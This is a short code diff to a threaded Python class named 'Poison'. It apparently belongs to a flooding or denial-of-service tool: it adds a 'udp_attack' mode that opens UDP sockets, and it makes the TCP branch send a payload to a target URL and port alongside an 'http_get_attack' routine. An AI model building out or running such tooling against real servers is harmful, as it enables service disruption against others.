@@ -15,7 +15,11 @@ class Poison (threading.Thread):
         self.threadID = threadID
         self.type_name = type_name
     def run(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if self.type_name == 'udp_attack':
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         url = self.url
         port = self.port
 
@@ -25,6 +29,7 @@ class Poison (threading.Thread):
             http_get_attack(sock, url, port)
         else:
             sock.connect((url, port))
+            sock.send("hello".encode('utf-8'))
         time.sleep(1)
         sock.close()
 
